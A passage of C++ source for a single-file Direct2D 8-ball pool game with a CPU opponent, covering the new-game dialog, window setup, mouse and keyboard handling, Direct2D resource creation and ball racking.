const D2D1_COLOR_F STRIPE_COLOR = D2D1::ColorF(D2D1::ColorF::Red);   // Stripes = Red
const D2D1_COLOR_F AIM_LINE_COLOR = D2D1::ColorF(D2D1::ColorF::White, 0.7f); // Semi-transparent white
const D2D1_COLOR_F FOUL_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(D2D1::ColorF::Blue);
const D2D1_COLOR_F ENGLISH_DOT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
const D2D1_COLOR_F UI_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Black);

// --- Forward Declarations ---
HRESULT CreateDeviceResources();
void DiscardDeviceResources();
void OnPaint();
void OnResize(UINT width, UINT height);
void InitGame();
void GameUpdate();
void UpdatePhysics();
void CheckCollisions();
bool CheckPockets(); // Returns true if any ball was pocketed
void ProcessShotResults();
void ApplyShot(float power, float angle, float spinX, float spinY);
void RespawnCueBall(bool behindHeadstring);
bool AreBallsMoving();
void SwitchTurns();
void AssignPlayerBallTypes(BallType firstPocketedType);
void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed);
Ball* GetBallById(int id);
Ball* GetCueBall();

// Drawing Functions
void DrawScene(ID2D1RenderTarget* pRT);
void DrawTable(ID2D1RenderTarget* pRT);
void DrawBalls(ID2D1RenderTarget* pRT);
void DrawCueStick(ID2D1RenderTarget* pRT);
void DrawAimingAids(ID2D1RenderTarget* pRT);
void DrawUI(ID2D1RenderTarget* pRT);
void DrawPowerMeter(ID2D1RenderTarget* pRT);
void DrawSpinIndicator(ID2D1RenderTarget* pRT);
void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT);
void DrawBallInHandIndicator(ID2D1RenderTarget* pRT);

// Helper Functions
float GetDistance(float x1, float y1, float x2, float y2);
float GetDistanceSq(float x1, float y1, float x2, float y2);
bool IsValidCueBallPosition(float x, float y, bool checkHeadstring);
template <typename T> void SafeRelease(T** ppT);
void PlaySoundImmediate(const wchar_t* soundFile);

// --- NEW Forward Declarations ---

// AI Related
struct AIShotInfo; // Define below
void TriggerAIMove();
void AIMakeDecision();
void AIPlaceCueBall();
AIShotInfo AIFindBestShot();
AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex);
bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2);
Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq); // Added hitDistSq output
float CalculateShotPower(float cueToGhostDist, float targetToPocketDist);
D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex);
bool IsValidAIAimAngle(float angle); // Basic check

// Dialog Related
INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
void ShowNewGameDialog(HINSTANCE hInstance);
void ResetGame(HINSTANCE hInstance); // Function to handle F2 reset

// --- Forward Declaration for Window Procedure --- <<< Add this line HERE
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

// --- NEW Struct for AI Shot Evaluation ---
struct AIShotInfo {
    bool possible = false;          // Is this shot considered viable?
    Ball* targetBall = nullptr;     // Which ball to hit
    int pocketIndex = -1;           // Which pocket to aim for (0-5)
    D2D1_POINT_2F ghostBallPos = { 0,0 }; // Where cue ball needs to hit target ball
    float angle = 0.0f;             // Calculated shot angle
    float power = 0.0f;             // Calculated shot power
    float score = -1.0f;            // Score for this shot (higher is better)
    bool involves8Ball = false;     // Is the target the 8-ball?
};

// --- NEW Dialog Procedure ---
INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG:
    {
        // --- ACTION 4: Center Dialog Box ---
// Optional: Force centering if default isn't working
        RECT rcDlg, rcOwner, rcScreen;
        HWND hwndOwner = GetParent(hDlg); // GetParent(hDlg) might be better if hwndMain is passed
        if (hwndOwner == NULL) hwndOwner = GetDesktopWindow();

        GetWindowRect(hwndOwner, &rcOwner);
        GetWindowRect(hDlg, &rcDlg);
        CopyRect(&rcScreen, &rcOwner); // Use owner rect as reference bounds

        // Offset the owner rect relative to the screen if it's not the desktop
        if (GetParent(hDlg) != NULL) { // If parented to main window (passed to DialogBoxParam)
            OffsetRect(&rcOwner, -rcScreen.left, -rcScreen.top);
            OffsetRect(&rcDlg, -rcScreen.left, -rcScreen.top);
            OffsetRect(&rcScreen, -rcScreen.left, -rcScreen.top);
        }


        // Calculate centered position
        int x = rcOwner.left + (rcOwner.right - rcOwner.left - (rcDlg.right - rcDlg.left)) / 2;
        int y = rcOwner.top + (rcOwner.bottom - rcOwner.top - (rcDlg.bottom - rcDlg.top)) / 2;

        // Ensure it stays within screen bounds (optional safety)
        x = std::max(static_cast<int>(rcScreen.left), x);
        y = std::max(static_cast<int>(rcScreen.top), y);
        if (x + (rcDlg.right - rcDlg.left) > rcScreen.right)
            x = rcScreen.right - (rcDlg.right - rcDlg.left);
        if (y + (rcDlg.bottom - rcDlg.top) > rcScreen.bottom)
            y = rcScreen.bottom - (rcDlg.bottom - rcDlg.top);


        // Set the dialog position
        SetWindowPos(hDlg, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);

        // --- End Centering Code ---

        // Set initial state based on current global settings (or defaults)
        CheckRadioButton(hDlg, IDC_RADIO_2P, IDC_RADIO_CPU, (gameMode == HUMAN_VS_HUMAN) ? IDC_RADIO_2P : IDC_RADIO_CPU);

        CheckRadioButton(hDlg, IDC_RADIO_EASY, IDC_RADIO_HARD,
            (aiDifficulty == EASY) ? IDC_RADIO_EASY : ((aiDifficulty == MEDIUM) ? IDC_RADIO_MEDIUM : IDC_RADIO_HARD));

        // Enable/Disable AI group based on initial mode
        EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), gameMode == HUMAN_VS_AI);
        EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), gameMode == HUMAN_VS_AI);
        EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), gameMode == HUMAN_VS_AI);
        EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), gameMode == HUMAN_VS_AI);
    }
    return (INT_PTR)TRUE;

    case WM_COMMAND:
        switch (LOWORD(wParam)) {
        case IDC_RADIO_2P:
        case IDC_RADIO_CPU:
        {
            bool isCPU = IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED;
            // Enable/Disable AI group controls based on selection
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), isCPU);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), isCPU);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), isCPU);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), isCPU);
        }
        return (INT_PTR)TRUE;

        case IDOK:
            // Retrieve selected options and store in global variables
            if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED) {
                gameMode = HUMAN_VS_AI;
                if (IsDlgButtonChecked(hDlg, IDC_RADIO_EASY) == BST_CHECKED) aiDifficulty = EASY;
                else if (IsDlgButtonChecked(hDlg, IDC_RADIO_MEDIUM) == BST_CHECKED) aiDifficulty = MEDIUM;
                else if (IsDlgButtonChecked(hDlg, IDC_RADIO_HARD) == BST_CHECKED) aiDifficulty = HARD;
            }
            else {
                gameMode = HUMAN_VS_HUMAN;
            }
            EndDialog(hDlg, IDOK); // Close dialog, return IDOK
            return (INT_PTR)TRUE;

        case IDCANCEL: // Handle Cancel or closing the dialog
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break; // End WM_COMMAND
    }
    return (INT_PTR)FALSE; // Default processing
}

// --- NEW Helper to Show Dialog ---
void ShowNewGameDialog(HINSTANCE hInstance) {
    if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), hwndMain, NewGameDialogProc, 0) == IDOK) {
        // User clicked Start, reset game with new settings
        isPlayer2AI = (gameMode == HUMAN_VS_AI); // Update AI flag
        if (isPlayer2AI) {
            switch (aiDifficulty) {
            case EASY: player2Info.name = L""CPU (Easy)""; break;
            case MEDIUM: player2Info.name = L""CPU (Medium)""; break;
            case HARD: player2Info.name = L""CPU (Hard)""; break;
            }
        }
        else {
            player2Info.name = L""Player 2"";
        }
        // Update window title
        std::wstring windowTitle = L""Direct2D 8-Ball Pool"";
        if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
        else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";
        SetWindowText(hwndMain, windowTitle.c_str());

        InitGame(); // Re-initialize game logic & board
        InvalidateRect(hwndMain, NULL, TRUE); // Force redraw
    }
    else {
        // User cancelled dialog - maybe just resume game? Or exit?
        // For simplicity, we do nothing, game continues as it was.
        // To exit on cancel from F2, would need more complex state management.
    }
}

// --- NEW Reset Game Function ---
void ResetGame(HINSTANCE hInstance) {
    // Call the helper function to show the dialog and re-init if OK clicked
    ShowNewGameDialog(hInstance);
}

// --- WinMain ---
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow) {
    if (FAILED(CoInitialize(NULL))) {
        MessageBox(NULL, L""COM Initialization Failed."", L""Error"", MB_OK | MB_ICONERROR);
        return -1;
    }

    // --- NEW: Show configuration dialog FIRST ---
    if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), NULL, NewGameDialogProc, 0) != IDOK) {
        // User cancelled the dialog
        CoUninitialize();
        return 0; // Exit gracefully if dialog cancelled
    }
    // Global gameMode and aiDifficulty are now set by the DialogProc

    // Set AI flag based on game mode
    isPlayer2AI = (gameMode == HUMAN_VS_AI);
    if (isPlayer2AI) {
        switch (aiDifficulty) {
        case EASY: player2Info.name = L""CPU (Easy)""; break;
        case MEDIUM: player2Info.name = L""CPU (Medium)""; break;
        case HARD: player2Info.name = L""CPU (Hard)""; break;
        }
    }
    else {
        player2Info.name = L""Player 2"";
    }
    // --- End of Dialog Logic ---


    WNDCLASS wc = { };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L""Direct2D_8BallPool"";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Use your actual icon ID here

    if (!RegisterClass(&wc)) {
        MessageBox(NULL, L""Window Registration Failed."", L""Error"", MB_OK | MB_ICONERROR);
        CoUninitialize();
        return -1;
    }

    // --- ACTION 4: Calculate Centered Window Position ---
    const int WINDOW_WIDTH = 1000; // Define desired width
    const int WINDOW_HEIGHT = 700; // Define desired height
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowX = (screenWidth - WINDOW_WIDTH) / 2;
    int windowY = (screenHeight - WINDOW_HEIGHT) / 2;

    // --- Change Window Title based on mode ---
    std::wstring windowTitle = L""Direct2D 8-Ball Pool"";
    if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
    else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";

    DWORD dwStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX; // No WS_THICKFRAME, No WS_MAXIMIZEBOX

    hwndMain = CreateWindowEx(
        0, L""Direct2D_8BallPool"", windowTitle.c_str(), dwStyle,
        windowX, windowY, WINDOW_WIDTH, WINDOW_HEIGHT,
        NULL, NULL, hInstance, NULL
    );

    if (!hwndMain) {
        MessageBox(NULL, L""Window Creation Failed."", L""Error"", MB_OK | MB_ICONERROR);
        CoUninitialize();
        return -1;
    }

    // Initialize Direct2D Resources AFTER window creation
    if (FAILED(CreateDeviceResources())) {
        MessageBox(NULL, L""Failed to create Direct2D resources."", L""Error"", MB_OK | MB_ICONERROR);
        DestroyWindow(hwndMain);
        CoUninitialize();
        return -1;
    }

    InitGame(); // Initialize game state AFTER resources are ready & mode is set

    ShowWindow(hwndMain, nCmdShow);
    UpdateWindow(hwndMain);

    if (!SetTimer(hwndMain, ID_TIMER, 1000 / TARGET_FPS, NULL)) {
        MessageBox(NULL, L""Could not SetTimer()."", L""Error"", MB_OK | MB_ICONERROR);
        DestroyWindow(hwndMain);
        CoUninitialize();
        return -1;
    }

    MSG msg = { };
    // --- Modified Main Loop ---
    // Handles the case where the game starts in SHOWING_DIALOG state (handled now before loop)
    // or gets reset to it via F2. The main loop runs normally once game starts.
    while (GetMessage(&msg, NULL, 0, 0)) {
        // We might need modeless dialog handling here if F2 shows dialog
        // while window is active, but DialogBoxParam is modal.
        // Let's assume F2 hides main window, shows dialog, then restarts game loop.
        // Simpler: F2 calls ResetGame which calls DialogBoxParam (modal) then InitGame.
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }


    KillTimer(hwndMain, ID_TIMER);
    DiscardDeviceResources();
    CoUninitialize();

    return (int)msg.wParam;
}

// --- WndProc ---
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        // Resources are now created in WinMain after CreateWindowEx
        return 0;

    case WM_PAINT:
        OnPaint();
        // Validate the entire window region after painting
        ValidateRect(hwnd, NULL);
        return 0;

    case WM_SIZE: {
        UINT width = LOWORD(lParam);
        UINT height = HIWORD(lParam);
        OnResize(width, height);
        return 0;
    }

    case WM_TIMER:
        if (wParam == ID_TIMER) {
            GameUpdate(); // Update game logic and physics
            InvalidateRect(hwnd, NULL, FALSE); // Request redraw
        }
        return 0;

        // --- NEW: Handle F2 Key for Reset ---
    case WM_KEYDOWN:
        if (wParam == VK_F2) {
            // Get HINSTANCE from the window handle
            HINSTANCE hInstance = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
            ResetGame(hInstance); // Call reset function
        }
        else if (wParam == VK_F1) {
            // Display copyright and developer message
            MessageBox(hwnd, L""Direct2D-based StickPool game made in C++ from scratch (2764+ lines of code)\n""
                L""First successful Clone in C++ (no other sites or projects were there to glean from.) Made /w AI assist\n""
                L""(others were in JS/ non-8-Ball in C# etc.) w/o OOP and Graphics Frameworks all in a Single file.\n""
                L""Copyright (C) 2025 Evans Thorpemorton, Entisoft Solutions.\n""
                L""Includes AI Difficulty Modes, Aim-Trajectory For Table Rails + Hard Angles TipShots. || F2=New Game"", L""About This Game"", MB_OK | MB_ICONINFORMATION);
        }
        return 0; // Indicate key was processed

    case WM_MOUSEMOVE: {
        ptMouse.x = LOWORD(lParam);
        ptMouse.y = HIWORD(lParam);

        Ball* cueBall = GetCueBall();
        if (!cueBall) return 0;

        // Logic for dragging cue ball during ball-in-hand (unchanged)
        //if (isDraggingCueBall && (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT)) {
                // only allow human to drag ball-in-hand
        if (isDraggingCueBall &&
            (currentGameState == BALL_IN_HAND_P1 ||
                (currentGameState == BALL_IN_HAND_P2 && !isPlayer2AI) ||
                currentGameState == PRE_BREAK_PLACEMENT)) {

            bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
            if (IsValidCueBallPosition((float)ptMouse.x, (float)ptMouse.y, behindHeadstring)) {
                cueBall->x = (float)ptMouse.x;
                cueBall->y = (float)ptMouse.y;
                cueBall->vx = cueBall->vy = 0; // Ensure it's stopped
            }
        }
        // Logic for aiming drag (unchanged math, just context)
        else if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            float dx = (float)ptMouse.x - cueBall->x;
            float dy = (float)ptMouse.y - cueBall->y;
            // Prevent setting angle if mouse is exactly on cue ball center
            if (dx != 0 || dy != 0) {
                cueAngle = atan2f(dy, dx);
            }
            // Calculate power based on distance pulled back from the initial click point (aimStartPoint)
            float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
            // Scale power more aggressively, maybe? Or keep scale factor 10.0
            shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER); // Scale power, clamp to max
        }
        // Logic for setting english (unchanged)
        else if (isSettingEnglish) {
            float dx = (float)ptMouse.x - spinIndicatorCenter.x;
            float dy = (float)ptMouse.y - spinIndicatorCenter.y;
            float dist = GetDistance(dx, dy, 0, 0);
            if (dist > spinIndicatorRadius) { // Clamp to edge
                dx *= spinIndicatorRadius / dist;
                dy *= spinIndicatorRadius / dist;
            }
            cueSpinX = dx / spinIndicatorRadius; // Normalize to -1 to 1
            cueSpinY = dy / spinIndicatorRadius;
        }
        // InvalidateRect is handled by WM_TIMER
        return 0;
    }

    case WM_LBUTTONDOWN: {
        ptMouse.x = LOWORD(lParam);
        ptMouse.y = HIWORD(lParam);

        // Check if clicking on Spin Indicator (unchanged)
        float spinDistSq = GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, spinIndicatorCenter.x, spinIndicatorCenter.y);
        if (spinDistSq < spinIndicatorRadius * spinIndicatorRadius) {
            isSettingEnglish = true;
            // Update spin immediately on click
            float dx = (float)ptMouse.x - spinIndicatorCenter.x;
            float dy = (float)ptMouse.y - spinIndicatorCenter.y;
            cueSpinX = dx / spinIndicatorRadius;
            cueSpinY = dy / spinIndicatorRadius;
            return 0; // Don't process other clicks if setting english
        }


        Ball* cueBall = GetCueBall();
        if (!cueBall) return 0;

        // Logic for Ball-in-Hand placement click (unchanged)
        if (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT) {
            float distSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
            if (distSq < BALL_RADIUS * BALL_RADIUS * 4) { // Allow clicking near the ball to start drag
                isDraggingCueBall = true;
            }
            else { // If clicking elsewhere on the table (and valid), place the ball
                bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                if (IsValidCueBallPosition((float)ptMouse.x, (float)ptMouse.y, behindHeadstring)) {
                    cueBall->x = (float)ptMouse.x;
                    cueBall->y = (float)ptMouse.y;
                    cueBall->vx = cueBall->vy = 0;
                    isDraggingCueBall = false;
                    // Transition state appropriate to ending placement
                    if (currentGameState == PRE_BREAK_PLACEMENT) {
                        // Depends on who is breaking
                        currentGameState = BREAKING;
                        // If AI was breaking, aiTurnPending should still be true
                    }
                    else if (currentGameState == BALL_IN_HAND_P1) {
                        currentGameState = PLAYER1_TURN;
                    }
                    else if (currentGameState == BALL_IN_HAND_P2) {
                        // If AI placed ball, AIMakeDecision should have been called? Or trigger now?
                        // Assuming SwitchTurns/Respawn set aiTurnPending correctly earlier
                        currentGameState = PLAYER2_TURN; // Ready for AI/Human P2 to aim
                    }
                }
            }
        }
        // --- MODIFIED: Logic for starting aim ---
        else if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN || currentGameState == BREAKING) {
            // Allow initiating aim by clicking in a larger radius around the cue ball
            float distSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
            // Increased radius check (e.g., 5x ball radius squared)
            if (distSq < BALL_RADIUS * BALL_RADIUS * 25) { // Click somewhat close to cue ball
                isAiming = true;
                aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Store where aiming drag started
                shotPower = 0; // Reset power
                // Transition to AIMING state (if not already BREAKING)
                if (currentGameState != BREAKING) {
                    currentGameState = AIMING;
                }
                // Set initial cueAngle based on click relative to ball, for immediate feedback
                float dx = (float)ptMouse.x - cueBall->x;
                float dy = (float)ptMouse.y - cueBall->y;
                if (dx != 0 || dy != 0) {
                    cueAngle = atan2f(dy, dx);
                    // If starting aim by clicking, maybe point stick towards mouse initially?
                    // Current logic updates angle on MOUSEMOVE anyway.
                }
            }
        }
        return 0;
    }

    case WM_LBUTTONUP: {
        ptMouse.x = LOWORD(lParam);
        ptMouse.y = HIWORD(lParam);

        if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            isAiming = false; // Stop the aiming drag visual state

            // --- MODIFIED: Increased threshold for taking shot ---
            if (shotPower > 0.15f) { // Only shoot if power is significant enough
                // Prevent player from shooting if it's AI's turn calculation phase
                if (currentGameState != AI_THINKING) {
                    // --- ACTION: Play Cue Strike Sound ---
                    //PlaySound(TEXT(""cue.wav""), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
                    PlaySoundImmediate(TEXT(""cue.wav""));
                    // --- End Sound ---
                    ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);
                    currentGameState = SHOT_IN_PROGRESS;
                    foulCommitted = false; // Reset foul flag for the new shot
                    pocketedThisTurn.clear();
                }
            }
            // If shotPower is too low, reset state back to player's turn
            else if (currentGameState != AI_THINKING) {
                // If no power, revert state back without shooting
                if (currentGameState == BREAKING) {
                    // Still breaking state if power was too low
                }
                else {
                    // Revert to appropriate player turn state
                    currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                    // Clear pending AI turn flag if it somehow got set during a zero-power human shot attempt
                    if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = false;
                }
            }
            shotPower = 0; // Reset power indicator regardless of shot taken
        }

        // Logic for releasing cue ball after dragging (unchanged)
        if (isDraggingCueBall) {
            isDraggingCueBall = false;
            // After placing the ball, transition state if needed (state might already be set by click placement)
            if (currentGameState == PRE_BREAK_PLACEMENT) {
                currentGameState = BREAKING;
            }
            else if (currentGameState == BALL_IN_HAND_P1) {
                currentGameState = PLAYER1_TURN;
            }
            else if (currentGameState == BALL_IN_HAND_P2) {
                currentGameState = PLAYER2_TURN;
                // If AI placed, aiTurnPending should trigger AI on next GameUpdate
            }
        }
        // Logic for releasing english setting (unchanged)
        if (isSettingEnglish) {
            isSettingEnglish = false;
        }
        return 0;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// --- Direct2D Resource Management ---

HRESULT CreateDeviceResources() {
    HRESULT hr = S_OK;

    // Create Direct2D Factory
    if (!pFactory) {
        hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
        if (FAILED(hr)) return hr;
    }

    // Create DirectWrite Factory
    if (!pDWriteFactory) {
        hr = DWriteCreateFactory(
            DWRITE_FACTORY_TYPE_SHARED,
            __uuidof(IDWriteFactory),
            reinterpret_cast<IUnknown**>(&pDWriteFactory)
        );
        if (FAILED(hr)) return hr;
    }

    // Create Text Formats
    if (!pTextFormat && pDWriteFactory) {
        hr = pDWriteFactory->CreateTextFormat(
            L""Segoe UI"", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
            16.0f, L""en-us"", &pTextFormat
        );
        if (FAILED(hr)) return hr;
        // Center align text
        pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
        pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
    }
    if (!pLargeTextFormat && pDWriteFactory) {
        hr = pDWriteFactory->CreateTextFormat(
            L""Impact"", NULL, DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
            48.0f, L""en-us"", &pLargeTextFormat
        );
        if (FAILED(hr)) return hr;
        pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING); // Align left
        pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
    }


    // Create Render Target (needs valid hwnd)
    if (!pRenderTarget && hwndMain) {
        RECT rc;
        GetClientRect(hwndMain, &rc);
        D2D1_SIZE_U size = D2D1::SizeU(rc.right - rc.left, rc.bottom - rc.top);

        hr = pFactory->CreateHwndRenderTarget(
            D2D1::RenderTargetProperties(),
            D2D1::HwndRenderTargetProperties(hwndMain, size),
            &pRenderTarget
        );
        if (FAILED(hr)) {
            // If failed, release factories if they were created in this call
            SafeRelease(&pTextFormat);
            SafeRelease(&pLargeTextFormat);
            SafeRelease(&pDWriteFactory);
            SafeRelease(&pFactory);
            pRenderTarget = nullptr; // Ensure it's null on failure
            return hr;
        }
    }

    return hr;
}

void DiscardDeviceResources() {
    SafeRelease(&pRenderTarget);
    SafeRelease(&pTextFormat);
    SafeRelease(&pLargeTextFormat);
    SafeRelease(&pDWriteFactory);
    // Keep pFactory until application exit? Or release here too? Let's release.
    SafeRelease(&pFactory);
}

void OnResize(UINT width, UINT height) {
    if (pRenderTarget) {
        D2D1_SIZE_U size = D2D1::SizeU(width, height);
        pRenderTarget->Resize(size); // Ignore HRESULT for simplicity here
    }
}

// --- Game Initialization ---
void InitGame() {
    srand((unsigned int)time(NULL)); // Seed random number generator

    // --- Ensure pocketed list is clear from the absolute start ---
    pocketedThisTurn.clear();

    balls.clear(); // Clear existing balls

    // Reset Player Info (Names should be set by Dialog/wWinMain/ResetGame)
    player1Info.assignedType = BallType::NONE;
    player1Info.ballsPocketedCount = 0;
    // Player 1 Name usually remains ""Player 1""
    player2Info.assignedType = BallType::NONE;
    player2Info.ballsPocketedCount = 0;
    // Player 2 Name is set based on gameMode in ShowNewGameDialog

    // Create Cue Ball (ID 0)
    // Initial position will be set during PRE_BREAK_PLACEMENT state
    balls.push_back({ 0, BallType::CUE_BALL, TABLE_LEFT + TABLE_WIDTH * 0.15f, RACK_POS_Y, 0, 0, CUE_BALL_COLOR, false });

    // --- Create Object Balls (Temporary List) ---
    std::vector<Ball> objectBalls;
    // Solids (1-7, Yellow)
    for (int i = 1; i <= 7; ++i) {
        objectBalls.push_back({ i, BallType::SOLID, 0, 0, 0, 0, SOLID_COLOR, false });
    }
    // Stripes (9-15, Red)
    for (int i = 9; i <= 15; ++i) {
        objectBalls.push_back({ i, BallType::STRIPE, 0, 0, 0, 0, STRIPE_COLOR, false });
    }
    // 8-Ball (ID 8) - Add it to the list to be placed
    objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false });


    // --- Racking Logic (Improved) ---
    float spacingX = BALL_RADIUS * 2.0f * 0.866f; // cos(30) for horizontal spacing
    float spacingY = BALL_RADIUS * 2.0f * 1.0f;   // Vertical spacing

    // Define rack positions (0-14 indices corresponding to triangle spots)
    D2D1_POINT_2F rackPositions[15];
    int rackIndex = 0;
    for (int row = 0; row < 5; ++row) {
        for (int col = 0; col <= row; ++col) {
            if (rackIndex >= 15) break;
            float x = RACK_POS_X + row * spacingX;
            float y = RACK_POS_Y + (col - row / 2.0f) * spacingY;
            rackPositions[rackIndex++] = D2D1::Point2F(x, y);
        }
    }

    // Separate 8-ball
    Ball eightBall;
    std::vector<Ball> otherBalls; // Solids and Stripes
    bool eightBallFound = false;
    for (const auto& ball : objectBalls) {
        if (ball.id == 8) {
            eightBall = ball;
            eightBallFound = true;
        }
        else {
            otherBalls.push_back(ball);
        }
    }
    // Ensure 8 ball was actually created (should always be true)
    if (!eightBallFound) {
        // Handle error - perhaps recreate it? For now, proceed.
        eightBall = { 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false };
    }


    // Shuffle the other 14 balls
    // Use std::shuffle if available (C++11 and later) for better randomness
    // std::random_device rd;
    // std::mt19937 g(rd());
    // std::shuffle(otherBalls.begin(), otherBalls.end(), g);
    std::random_shuffle(otherBalls.begin(), otherBalls.end()); // Using deprecated for now

    // --- Place balls into the main 'balls' vector in rack order ---
    // Important: Add the cue ball (already created) first.
    // (Cue ball added at the start of the function now)

    // 1. Place the 8-ball in its fixed position (index 4 for the 3rd row center)
    int eightBallRackIndex = 4;
    eightBall.x = rackPositions[eightBallRackIndex].x;
    eightBall.y = rackPositions[eightBallRackIndex].y;
    eightBall.vx = 0;
    eightBall.vy = 0;
    eightBall.isPocketed = false;
    balls.push_back(eightBall); // Add 8 ball to the main vector

    // 2. Place the shuffled Solids and Stripes in the remaining spots
    int otherBallIdx = 0;
    for (int i = 0; i < 15; ++i) {
        if (i == eightBallRackIndex) continue; // Skip the 8-ball spot

        if (otherBallIdx < otherBalls.size()) {
            Ball& ballToPlace = otherBalls[otherBallIdx++];
            ballToPlace.x = rackPositions[i].x;
            ballToPlace.y = rackPositions[i].y;
            ballToPlace.vx = 0;
            ballToPlace.vy = 0;
            ballToPlace.isPocketed = false;
            balls.push_back(ballToPlace); // Add to the main game vector
        }
    }
    // --- End Racking Logic ---


    // --- Determine Who Breaks and Initial State ---
    if (isPlayer2AI) {
        // AI Mode: Randomly decide who breaks
        if ((rand() % 2) == 0) {
            // AI (Player 2) breaks
            currentPlayer = 2;
            currentGameState = PRE_BREAK_PLACEMENT; // AI needs to place ball first
            aiTurnPending = true; // Trigger AI logic
        }
        else {
            // Player 1 (Human) breaks
            currentPlayer = 1;
            currentGameState = PRE_BREAK_PLACEMENT; // Human places cue ball
            aiTurnPending = false;
        }
    }
    else {
        // Human vs Human, Player 1 breaks
        currentPlayer = 1;
        currentGameState = PRE_BREAK_PLACEMENT;
        aiTurnPending = false; // No AI involved
    }

    // Reset other relevant game state variables
    foulCommitted = false;
    gameOverMessage = L"""";
    firstBallPocketedAfterBreak = false;
    // pocketedThisTurn cleared at start
    // Reset shot parameters and input flags
    shotPower = 0.0f;
    cueSpinX = 0.0f;
    cueSpinY = 0.0f;
    isAiming = false;
    isDraggingCueBall = false;
    isSettingEnglish = false;
    cueAngle = 0.0f; // Reset aim angle
}


// --- Game Loop ---
void GameUpdate() {
